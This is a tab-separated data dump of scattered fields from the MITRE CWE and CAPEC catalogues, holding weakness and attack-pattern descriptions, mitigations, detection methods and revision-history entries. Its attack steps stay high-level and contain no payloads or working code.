23181	39	2008-07-01
14862	39	2018-03-27
7017	57	Primary
12752	56	ChildOf
17467	35	MITRE
11151	90	Language-Independent
15056	79	Integrity
10259	62	updated Time_of_Introduction
23393	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
13158	28	CWE Content Team
25167	35	MITRE
16232	39	2011-06-27
19874	23	The software parses a formatted message or structure, but it does not handle or incorrectly handles a length field that is inconsistent with the actual length of the associated data.
22807	24	MITRE
13120	62	updated Causal_Nature, References, Relationships, Taxonomy_Mappings
8619	35	MITRE
7185	39	2017-11-08
15124	81	Integrity
17084	28	Eric Dalci
11668	35	MITRE
10660	47	Other
22019	39	2014-06-23
8373	39	2011-06-01
14713	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
17081	39	2015-12-07
23794	78	High
9873	46	An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.
11497	31	1003
7734	62	updated Relationships
24695	61	Stable
21130	28	CWE Content Team
16899	35	MITRE
10247	28	CWE Content Team
18980	35	MITRE
8852	62	updated Potential_Mitigations
12106	28	CWE Content Team
18390	50	Frequent changing of handset and retransmission device
23252	69	Incomplete
8976	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
17754	97	HTTP Verb Tampering
6729	35	MITRE
6481	26	Architecture and Design
8946	49	2010
11778	100	The MITRE Corporation
13787	39	2009-05-27
11906	35	MITRE
13379	28	Eric Dalci
23272	35	MITRE
12966	28	CWE Content Team
23097	85	568
24927	77	Architecture or Design Review
16572	62	updated References, Relationships
20738	69	Incomplete
14756	39	2012-05-11
24161	96	2010-12-08
16010	39	2010-04-05
5982	63	DoS: Crash, Exit, or Restart
19140	73	Analyze system documentation to find list of events that could potentially cause account lockout
19662	66	On Interpretation Conflict Vulnerabilities
10887	39	2013-07-17
15711	28	CWE Content Team
22436	79	Authorization
10046	97	Rainbow Table Password Cracking
7449	33	Tim Newsham
15379	78	Medium
18918	28	CWE Content Team
23887	56	ChildOf
16064	62	updated Type
20749	59	Updated Attack_Motivation-Consequences, Description, Description Summary, Examples-Instances, Related_Weaknesses
8240	59	Updated Related_Weaknesses
24800	39	2019-06-20
11182	97	Using Slashes and URL Encoding Combined to Bypass Validation Logic
21410	56	ChildOf
23799	44	High
14566	45	Variant
15465	56	ChildOf
9249	79	Confidentiality
9118	28	CWE Content Team
23547	42	For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.
11442	28	Eric Dalci
21418	60	13
21977	39	2008-08-01
14335	52	Because byte ordering bugs are usually very noticeable even with normal inputs, this bug is more likely to occur in rarely triggered error conditions, making them difficult to detect using black box methods.
8667	63	Unexpected State
8663	63	Read Application Data
14680	35	MITRE
15159	25	Medium
22406	39	2008-11-24
19996	62	updated Potential_Mitigations
15930	69	Draft
7493	35	KDM Analytics
19170	59	Updated Related_Weaknesses
12976	35	MITRE
7195	28	CWE Content Team
22833	62	updated References, Relationships
23703	62	added/updated white box definitions
6491	39	2010-12-13
8273	39	2010-04-05
6519	47	Read Data
17818	35	MITRE
16404	62	Significant description modifications to emphasize different variants.
17432	43	Simple
15387	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
12805	26	Architecture and Design
19108	39	2012-05-11
24538	78	Very High
10322	72	This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.
22041	39	2011-06-27
19850	35	MITRE
9138	36	http://www.w3schools.com/tags/ref_urlencode.asp
9914	35	MITRE
15240	62	updated Applicable_Platforms
16772	39	2009-12-28
22492	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
10139	104	1124
8525	39	2010-12-13
22473	72	Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility.
10738	77	Automated Dynamic Analysis
17722	62	updated Name, Relationships, Other_Notes, Taxonomy_Mappings
11187	50	Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
19520	100	The MITRE Corporation
24418	56	ChildOf
24537	104	1082
9577	102	ChildOf
8608	56	ChildOf
16844	103	Primary
20028	35	MITRE
20193	85	234
20913	31	1000
8259	35	MITRE
20836	62	updated Relationships, Taxonomy_Mappings
16113	35	MITRE
24298	35	MITRE
18460	26	Architecture and Design
19919	35	MITRE
10477	35	MITRE
11337	26	Implementation
10614	53	The MITRE Corporation
11285	79	Confidentiality
16568	73	Send the malicious crafted XML message containing recursive entity uses to the target URL.
6762	79	Confidentiality
18259	35	Cigital
20845	90	PHP
16930	28	CWE Content Team
19092	76	2019-04-04
8570	28	CWE Content Team
23494	88	Incorrect Behavior Order: Validate Before Filter
9756	62	updated Description, Other_Notes, Potential_Mitigations
15909	47	Hide Activities
21482	35	MITRE
22118	28	CWE Content Team
24534	24	Cigital
6853	46	Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.
24441	91	Implementation
21069	56	ChildOf
24253	35	MITRE
22121	35	MITRE
9180	76	2018-07-31
8397	40	The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).
13964	79	Confidentiality
25430	91	Architecture and Design
16752	85	414
16002	59	Updated @Abstraction
10687	31	1000
18623	61	Draft
10362	35	MITRE
8692	21	PLOVER
7982	62	updated Potential_Mitigations
14726	62	updated Maintenance_Notes
12498	35	MITRE
15538	31	699
14824	62	updated Observed_Examples, Relationships, Taxonomy_Mappings
25329	34	This problem typically occurs when the programmer makes a typo, or copy and paste errors.
17868	104	1100
21318	28	CWE Content Team
23514	79	Authorization
7792	39	2017-11-08
18678	66	Toward Automated Detection of Logic Vulnerabilities in Web Applications
12316	81	Availability
11368	55	CAPEC Content Team
13921	39	2011-06-01
21594	103	Primary
14273	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.
7431	45	Base
8412	28	CWE Content Team
11435	62	updated Description, Relationships
11291	56	ChildOf
18175	35	MITRE
15957	26	Implementation
22192	39	2012-10-30
15249	39	2017-11-08
14353	39	2017-05-03
18346	55	CAPEC Content Team
16320	35	MITRE
7965	73	Hide action controls over very commonly used functionality.
9916	23	In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.
13686	28	Sean Eidemiller
6704	101	CAPEC Content Team
19288	104	1050
10860	39	2008-07-01
15175	81	Availability
23723	23	An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document. These 'FlashVars' are most often passed to the Flash file via URL arguments or from the Object or Embed tag within the embedding HTML document. If these FlashVars are not properly sanitized, an adversary may be able to embed malicious content (such as scripts) into the HTML document. The injected parameters can also provide the adversary control over other objects within the Flash file as well as full control over the parent document's DOM model. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. Flash Parameter Injection attacks can also preface further attacks such as various forms of Cross-Site Scripting (XSS) attacks in addition to Session Hijacking attacks.
11457	39	2009-01-12
9142	63	Execute Unauthorized Code or Commands
14081	35	MITRE
20339	28	CWE Content Team
11595	79	Authorization
10948	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
19798	28	CWE Content Team
19702	35	MITRE
23198	25	High
15495	35	MITRE
7377	31	1000
10011	90	Language-Independent
23684	35	MITRE
21187	62	updated References, Relationships
25280	100	The MITRE Corporation
17023	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-59] [REF-57].
14939	59	Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required
14971	28	CWE Content Team
13907	36	https://www.usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf
18819	90	Language-Independent
5748	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
12458	62	updated Relationships
7359	51	2015-11-09
20391	26	Architecture and Design
11459	76	2017-08-04
15521	62	updated Potential_Mitigations
10401	62	updated Demonstrative_Examples
24655	62	updated Other_Notes, Relationship_Notes
7631	63	Execute Unauthorized Code or Commands
8576	39	2009-10-29
11560	28	CWE Content Team
14997	74	1
7258	32	The Wikimedia Foundation, Inc
13866	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
14621	62	updated Potential_Mitigations
11942	45	Base
15396	28	CWE Content Team
6718	28	CWE Content Team
19739	63	Unexpected State
8051	27	None: No specialized resources are required to execute this type of attack.
14494	39	2008-09-08
9294	23	Storing a password in plaintext may result in a system compromise.
22983	44	SOAR Partial
13441	62	updated Potential_Mitigations, Time_of_Introduction
23286	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
18573	46	When a system or process combines multiple independent components, this often produces new, emergent behaviors at the system level.  However, if the interactions between these components are not fully accounted for, some of the emergent behaviors can be incorrect or even insecure.
21804	28	CWE Content Team
5643	39	2017-01-19
6246	62	updated Relationships, Taxonomy_Mappings
14708	56	ChildOf
9174	100	The MITRE Corporation
16545	62	updated Relationships, Taxonomy_Mappings
19033	55	CAPEC Content Team
13264	35	MITRE
23808	28	CWE Content Team
6095	31	699
6322	104	767
11624	23	Files or directories are accessible in the environment that should not be.
10362	62	updated Relationships, Taxonomy_Mappings
20032	53	The MITRE Corporation
8184	103	Primary
7197	31	699
13372	28	CWE Content Team
24170	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
19689	35	MITRE
10891	88	Symbolic Name not Mapping to Correct Object
18508	73	Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).
15442	35	MITRE
22324	44	High
15863	55	CAPEC Content Team
5814	104	392
24779	39	2009-01-12
8223	60	13
14823	45	Base
18883	59	Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required
22737	89	Detailed
11869	28	CWE Content Team
20380	62	updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Observed_Examples
11391	104	1073
17511	28	CWE Content Team
7350	56	ChildOf
6174	85	385
21275	62	updated Taxonomy_Mappings
21334	39	2014-02-18
5638	49	2005
14189	101	CAPEC Content Team
18256	62	updated Relationships
24177	62	updated Potential_Mitigations, References
7589	39	2008-07-01
20722	35	MITRE
9627	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19648	35	Cigital
10653	76	2019-09-30
21882	73	Use an automated tool to record all instances of URLs to process XML requests.
5931	53	The MITRE Corporation
14232	86	http://www.wired.com/threatlevel/2009/01/professed-twitt/
20230	103	Primary
13419	28	CWE Content Team
18833	55	CAPEC Content Team
6030	104	32
24852	28	CWE Content Team
12889	48	03
21431	79	Authorization
9720	28	CWE Content Team
19557	28	CWE Content Team
20814	23	The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which he is unauthorized.
8102	95	[Develop or Obtain malware and install on a USB device] The adversary develops or obtains the malicious software necessary to exploit the target system, which he then installs on an external USB device such as a USB flash drive.
14417	72	If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator.
8190	62	updated Potential_Mitigations
15491	39	2011-03-29
9952	39	2011-03-29
20194	81	Integrity
7525	97	IP 'ID' Echoed Byte-Order Probe
18845	28	CWE Content Team
22816	81	Access Control
19520	101	CAPEC Content Team
7419	35	MITRE
17192	39	2014-07-30
13600	45	Base
12086	23	An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.
11229	81	Other
15826	39	2014-02-18
5783	35	MITRE
22945	35	MITRE
20081	104	749
9810	63	Modify Application Data
17775	62	updated Common_Consequences
21508	62	updated Potential_Mitigations
22288	35	MITRE
12097	62	updated Causal_Nature, Demonstrative_Examples, Modes_of_Introduction, Relationships
18032	73	Spider web sites for all available links
10036	46	A resource injection issue occurs when the following two conditions are met:                                                An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.                   By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.                                          This may enable an attacker to access or modify otherwise protected system resources.
21858	30	Tongbo Luo
14332	104	560
11127	50	Ensure that proper permissions on files and folders are enacted to limit accessibility.
16778	86	http://www.ddj.com/security/193501774
12839	28	CWE Content Team
16055	94	Run Arbitrary Code
19147	55	CAPEC Content Team
16912	39	2009-07-27
9269	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
11998	54	Low
7909	70	Towards a Comprehensive Picture of the Great Firewall's DNS Censorship
15163	35	MITRE
7819	39	2009-01-12
16205	28	CWE Content Team
17540	91	Architecture and Design
14094	39	2008-10-14
23565	35	MITRE
17458	94	Intercept and control cellular data communications to/from mobile device.
18970	49	2008
11065	28	CWE Content Team
24739	103	Primary
13110	31	1000
18901	62	updated Relationships, Taxonomy_Mappings
22733	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
13327	39	2008-11-24
7272	63	Modify Memory
24366	78	Low
12260	100	The MITRE Corporation
10671	74	2
17853	39	2010-02-16
15222	28	CWE Content Team
20330	56	ChildOf
23566	28	CWE Content Team
8145	90	Java
18411	62	updated Potential_Mitigations, Time_of_Introduction
21307	33	Yves Younan
14801	81	Other
11923	35	MITRE
17605	46	It is never a good idea for a web application to attempt to shut down the application container. Access to a function that can shut down the application is an avenue for Denial of Service (DoS) attacks.
20563	28	CWE Content Team
16323	95	[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.
15439	48	01
18835	56	ChildOf
20293	62	updated Potential_Mitigations
22200	85	194
13846	77	Architecture or Design Review
10039	63	Read Application Data
10590	78	Medium
8729	51	2014-06-23
19206	39	2017-11-08
16959	62	updated Relationships, Taxonomy_Mappings
22574	35	MITRE
10344	92	Exploit
18304	62	updated Alternate_Terms, Description, Relationship_Notes, Relationships
17946	35	MITRE
25024	31	1000
23343	35	Cigital
18662	47	Read Data
12673	63	Bypass Protection Mechanism
9470	88	Information Exposure Through Behavioral Discrepancy
17205	39	2009-05-27
16375	39	2009-12-28
14239	85	190
22176	39	2013-02-21
23918	53	The MITRE Corporation
14223	39	2012-10-30
6231	28	CWE Content Team
10881	35	MITRE
25196	58	A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.
15193	39	2011-06-01
7083	56	ChildOf
8944	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-60] [REF-61].
7981	62	updated Relationships, Other_Notes, Taxonomy_Mappings
17631	81	Confidentiality
17855	101	CAPEC Content Team
20923	60	20
15917	45	Variant
16700	102	ChildOf
19021	46	In many languages, the compare statement is very close in appearance to the assignment statement; they are often confused.
19643	62	updated Relationships
15972	103	Primary
12252	47	Modify Data
7034	90	Language-Independent
23017	21	PLOVER
9543	39	2010-12-13
11361	39	2012-10-30
17547	28	CWE Content Team
6946	62	updated Relationships
11651	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
12328	90	Language-Independent
16743	62	updated Demonstrative_Examples, Relationships
21960	35	MITRE
23330	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
6883	39	2008-10-14
8702	62	updated Detection_Factors, References, Relationships
19539	28	CWE Content Team
6176	51	2018-07-31
14819	33	Microsoft Corporation
7947	28	CWE Content Team
5711	44	Moderate
7413	91	Architecture and Design
24938	89	Detailed
24180	23	This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the "shortest possible" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.
24450	85	125
7236	35	MITRE
14744	62	updated Relationships
6691	43	Simple
17419	39	2017-05-03
18981	28	CWE Content Team
6623	28	CWE Content Team
17851	88	Insufficient Isolation of Symbolic Constant Definitions
13900	62	updated Common_Consequences
7166	35	MITRE
6065	73	If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.
12120	50	Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.
21017	35	MITRE
12460	102	ChildOf
17711	92	Experiment
22848	35	MITRE
18297	101	CAPEC Content Team
6460	100	The MITRE Corporation
12517	62	updated Relationships, Taxonomy_Mappings
14432	28	CWE Content Team
16140	24	MITRE
12735	30	Shaun Colley
11071	39	2008-09-08
7083	31	699
11217	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
7034	43	Simple
22918	76	2018-07-31
12188	42	Avoid race conditions (CWE-362) during initialization routines.
19646	39	2019-06-20
14464	56	ChildOf
20048	35	MITRE
7557	23	The software defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.
13923	70	M Trends Report
11592	28	CWE Content Team
24066	45	Variant
16725	103	Primary
18807	42	Authentication mechanisms should always require sufficiently complex passwords and require that they be periodically changed.
7393	90	Perl
19236	39	2011-06-27
14808	39	2017-05-03
6477	39	2010-12-13
23757	35	MITRE
10300	35	MITRE
7883	39	2014-07-30
22751	104	204
11145	23	The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.
20051	31	1000
19810	81	Confidentiality
12028	53	The MITRE Corporation
6878	73	TCP/IP Fingerprinting
9175	39	2009-03-10
7472	69	Draft
22408	81	Other
8656	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
22689	62	updated Potential_Mitigations
11505	35	MITRE
23815	39	2008-11-24
20843	56	ChildOf
8899	35	MITRE
13626	76	2017-01-09
17335	101	CAPEC Content Team
23097	50	Strong physical security can help reduce the ability of an adversary to install a keylogger.
24572	40	An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.
8584	101	CAPEC Content Team
14038	62	updated Common_Consequences, Relationships
8145	23	The software uses the singleton pattern when creating a resource within a multithreaded environment.
16733	73	Use a proxy tool to record results of manual input of XSS probes in known URLs.
17096	85	88
25367	44	Moderate
22040	85	160
12002	62	updated Related_Attack_Patterns
7783	63	Modify Application Data
22486	101	CAPEC Content Team
19461	26	Architecture and Design
22598	39	2008-10-14
14460	35	MITRE
14457	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20047	91	Implementation
14772	62	updated Related_Attack_Patterns, Relationships
8987	63	Read Files or Directories
13673	90	Language-Independent
13247	90	Language-Independent
22670	103	Primary
21622	62	updated Potential_Mitigations
14690	28	CWE Content Team
17258	27	Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.
5855	28	Eric Dalci
17155	62	updated Relationships
12637	97	Windows ::DATA Alternate Data Stream
9864	35	MITRE
9871	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
6882	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
18778	39	2011-03-29
23542	35	MITRE
22539	91	Implementation
17816	35	MITRE
20739	90	C++
19047	45	Variant
17487	28	CWE Content Team
20294	81	Availability
21129	67	High
19503	35	MITRE
20739	45	Variant
18612	104	314
13766	35	MITRE
6899	39	2008-07-01
13260	56	ChildOf
14282	62	updated Other_Notes
10727	62	updated Relationships
18212	39	2008-09-08
17686	30	Sigbjørn Vik
7020	72	The program could wind up using the wrong number and generate incorrect results. If the number is used to allocate resources or make a security decision, then this could introduce a vulnerability.
21347	62	updated Relationships
24568	28	Eric Dalci
14575	103	Primary
17534	81	Other
6888	39	2011-03-29
14200	39	2011-06-01
16132	62	updated Relationships
21196	86	http://nvd.nist.gov/fdcc/index.cfm
10348	62	updated Relationships
15873	95	[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.
20096	50	Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.
9882	28	CWE Content Team
21102	56	ChildOf
25363	79	Access Control
20161	100	The MITRE Corporation
11275	24	MITRE
22343	94	Run Arbitrary Code
15519	92	Experiment
12311	46	By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the software or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.             For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the software might still perform the transfer.             Note that this is different than CWE-696, which focuses on when the software performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.             Workflow-related behaviors include:                                                Steps are performed in the expected order.                   Required steps are not omitted.                   Steps are not interrupted.                   Steps are performed in a timely fashion.
8768	39	2017-11-08
24326	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Framework-based Fuzzer
21786	62	Suggested OWASP Top Ten 2004 mapping
8657	62	updated Relationships
9826	39	2010-04-05
18302	49	2018
21845	56	ChildOf
20477	78	Medium
21085	28	CWE Content Team
18963	35	MITRE
21104	76	2018-07-31
9295	100	The MITRE Corporation
20835	28	CWE Content Team
19015	28	CWE Content Team
16085	31	699
18951	85	133
11777	23	The referer field in HTTP requests can be easily modified and, as such, is not a valid means of message integrity checking.
5972	28	CWE Content Team
21336	26	Architecture and Design
5703	27	None: No specialized resources are required to execute this type of attack.
23051	35	MITRE
12290	28	CWE Content Team
8934	55	CAPEC Content Team
19449	103	Primary
9711	34	This typically occurs in situations when only one value is expected.
17193	91	Architecture and Design
18749	28	CWE Content Team
18673	39	2012-05-11
9908	62	updated Potential_Mitigations
20067	35	MITRE
9649	31	1000
21104	101	CAPEC Content Team
23403	81	Integrity
11679	63	Alter Execution Logic
24790	48	12
23646	56	ChildOf
13088	28	CWE Content Team
18394	62	updated Demonstrative_Examples
24360	62	updated Relationships, Taxonomy_Mappings
19468	35	MITRE
7942	66	Microsoft's Free Security Tools – banned.h
7372	62	updated Time_of_Introduction
23944	79	Authorization
7721	39	2013-02-21
18859	69	Incomplete
12329	28	CWE Content Team
7899	53	The MITRE Corporation
11218	35	MITRE
13051	71	2006
14614	81	Other
18570	35	MITRE
13146	31	1000
19311	104	652
14042	103	Primary
15710	74	2
11495	42	Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.).
19703	81	Confidentiality
22059	81	Other
25157	28	CWE Content Team
19300	35	MITRE
16936	31	1000
12823	39	2009-05-27
15293	35	MITRE
16749	77	Dynamic Analysis with Automated Results Interpretation
12319	103	Primary
18066	104	664
10356	79	Confidentiality
8732	56	ChildOf
7972	28	CWE Content Team
14934	63	Gain Privileges or Assume Identity
20638	28	CWE Content Team
12929	35	MITRE
8798	91	Architecture and Design
24741	62	updated Relationships
19497	35	MITRE
9293	47	Hide Activities
9380	39	2011-06-27
13143	62	updated Related_Attack_Patterns, Relationships
15390	62	updated Potential_Mitigations, Time_of_Introduction
14868	39	2012-05-11
8533	74	1
10654	56	ChildOf
19276	28	CWE Content Team
5965	56	CanAlsoBe
15287	35	MITRE
18229	63	DoS: Crash, Exit, or Restart
6340	51	2014-06-23
17750	39	2011-06-01
20572	35	Cigital
8348	55	CAPEC Content Team
6989	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
19331	48	04
22624	103	Primary
5675	28	CWE Content Team
14591	69	Incomplete
20113	39	2011-06-27
13369	59	Updated Description Summary
9703	39	2019-01-03
16928	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships
8683	62	updated Time_of_Introduction
15895	21	PLOVER
16897	44	SOAR Partial
14740	28	CWE Content Team
6309	62	updated Potential_Mitigations
17785	35	MITRE
5607	92	Explore
7147	35	MITRE
14218	62	updated Relationships
12979	39	2012-05-11
15774	50	Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.
12456	96	2018-07-02
6951	35	MITRE
16974	28	CWE Content Team
6194	103	Primary
21426	35	MITRE
24311	35	MITRE
7422	28	CWE Content Team
